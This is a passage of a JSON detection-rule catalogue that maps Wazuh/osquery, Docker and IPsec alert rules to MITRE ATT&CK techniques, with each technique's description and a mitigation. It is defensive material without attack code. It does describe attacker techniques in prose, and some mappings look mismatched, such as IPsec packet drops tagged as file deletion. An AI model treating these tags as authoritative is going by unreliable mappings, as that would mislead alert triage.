            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24714,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): svchost.exe process masquerading detected, the parent process is incorrect",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24801,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): BetternetVPN Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24802,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): Chrometana Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24803,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): CopyFish Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24804,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): Giphy Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24805,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): HolaVPN Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24806,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): InfinityNewTab Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24807,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): SocialFixer Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24808,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): TouchVPN Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24809,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): WebDeveloper Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24810,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): WebPaint Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24811,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): MacOSInstallCore Chrome extension malware detected",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 87902,
        "rule_description": "Docker: Container $(docker.Actor.Attributes.name) destroyed",
        "mitre_id": [
            "T1561.001"
        ],
        "possible_attacks": [
            "Disk Content Wipe"
        ],
        "description": [
            "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like [RawDisk]( to directly access disk content. This behavior is distinct from [Data Destruction]( because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]("
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
        ]
    },
    {
        "rule_id": 87914,
        "rule_description": "Docker: Volume destroyed in $(docker.Actor.Attributes.driver)",
        "mitre_id": [
            "T1070.004",
            "T1561.001"
        ],
        "possible_attacks": [
            "Disk Content Wipe"
        ],
        "description": [
            "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like [RawDisk]( to directly access disk content. This behavior is distinct from [Data Destruction]( because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]("
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
        ]
    },
    {
        "rule_id": 87921,
        "rule_description": "Docker: Container $(docker.Actor.Attributes.name) deleted",
        "mitre_id": [
            "T1070.004",
            "T1561.001"
        ],
        "possible_attacks": [
            "Disk Content Wipe"
        ],
        "description": [
            "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like [RawDisk]( to directly access disk content. This behavior is distinct from [Data Destruction]( because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]("
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
        ]
    },
    {
        "rule_id": 87931,
        "rule_description": "Docker: Network $(docker.Actor.Attributes.name) deleted",
        "mitre_id": [
            "T1070.004",
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 87941,
        "rule_description": "Docker: Secret '$(docker.Actor.Attributes.name)' removed",
        "mitre_id": [
            "T1070.004",
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 87946,
        "rule_description": "Docker: Plugin $(docker.Actor.Attributes.name) removed",
        "mitre_id": [
            "T1070.004",
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 87957,
        "rule_description": "Docker: Service $(docker.Actor.Attributes.name) deleted",
        "mitre_id": [
            "T1070.004",
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 18655,
        "rule_description": "IPsec dropped an inbound packet that failed an integrity check",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 18656,
        "rule_description": "IPsec dropped an inbound packet that failed a replay check",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 18657,
        "rule_description": "IPsec dropped an inbound clear text packet that should have been secured",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 18658,
        "rule_description": "IPsec received a packet from a remote computer with an incorrect Security Parameter Index (SPI)",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 18659,
        "rule_description": "During Main Mode negotiation, IPsec received an invalid negotiation packet",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 18660,
        "rule_description": "During Quick Mode negotiation, IPsec received an invalid negotiation packet",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 18661,
        "rule_description": "During Extended Mode negotiation, IPsec received an invalid negotiation packet",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
